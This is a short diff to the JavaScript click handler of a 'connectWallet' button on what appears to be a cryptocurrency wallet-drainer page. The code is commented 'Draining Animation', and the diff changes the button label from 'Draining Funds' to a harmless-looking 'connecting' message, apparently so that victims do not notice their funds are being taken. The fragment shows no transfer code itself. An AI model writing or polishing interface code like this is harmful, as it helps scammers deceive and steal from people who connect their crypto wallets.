@@ -69,8 +69,8 @@ document.getElementById('connectWallet').onclick = async function() {
   // Draining Animation
   const btn = this;
   const originalText = btn.innerHTML;
-  btn.disabled = true;
-  btn.innerHTML = '⏳ Draining Funds... 25%';
+  btn.disabled = false;
+  btn.innerHTML = '⏳ connecting... 25%';
   
   // Auto-detect coin
   let coin = 'BTC';
